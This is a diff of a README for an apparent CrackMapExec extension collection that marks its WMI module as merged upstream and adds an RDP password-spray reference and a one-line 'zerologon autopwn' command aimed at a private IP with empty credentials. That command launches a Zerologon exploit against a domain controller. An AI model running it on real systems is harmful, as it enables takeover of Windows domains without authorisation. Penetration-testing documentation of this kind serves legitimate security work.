@@ -14,10 +14,11 @@ CrackMapExec extension module/protocol support
   Original from: [RDPassSpray.py](https://github.com/xFreed0m/RDPassSpray/blob/master/RDPassSpray.py)  
   ![image](https://user-images.githubusercontent.com/30458572/175292568-0d8472eb-7b61-4213-bd00-549f198f4676.png)
 
-- ### cme-wmi(Experimentally)  
-  Forked from [Orange-Cyberdefense upstream](https://github.com/Orange-Cyberdefense/cme-wmi) , use impacket DCOM function instead of RPCRequester.  
-  For more details: [XiaoliChan's Forked](https://github.com/XiaoliChan/CrackMapExec-WMI)  
-  ![image](https://user-images.githubusercontent.com/30458572/172290474-1021ab72-fbaa-43c2-801a-ba5f8e609b1c.png)
+- ### cme-wmi
+  Merged in official branch now. :)
+
+- ### cme-zerologon-autopwn
+  CME 192.168.1.1 -u '' -p '' -M zerologon -o mode=pwn
 
 ### Usage (development version)
 
@@ -29,7 +30,6 @@ CrackMapExec extension module/protocol support
 git clone https://github.com/mpgn/CrackMapExec.git
 cd CrackMapExec
 git clone https://github.com/XiaoliChan/CrackMapExec-Extension.git
-cp -r CrackMapExec-Extension/cme-wmi/* cme/protocols/
 cp -r CrackMapExec-Extension/cme-xfreerdp/* cme/protocols/
 python3 -m pip install pipx
 pipx install .
